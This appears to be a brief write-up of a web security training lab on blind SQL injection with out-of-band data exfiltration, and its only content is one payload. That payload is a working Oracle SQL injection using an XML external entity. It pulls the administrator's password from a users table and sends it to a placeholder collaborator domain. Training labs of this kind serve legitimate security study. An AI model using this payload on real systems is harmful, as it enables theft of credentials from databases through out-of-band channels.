# Lab: Blind SQL injection with out-of-band data exfiltration

## Objective
Perform the attack to solve Blind SQL injection with out-of-band data exfiltration.

## Payload
```text
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%23+SYSTEM+"http://'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25#;]>'),'/l')--
```
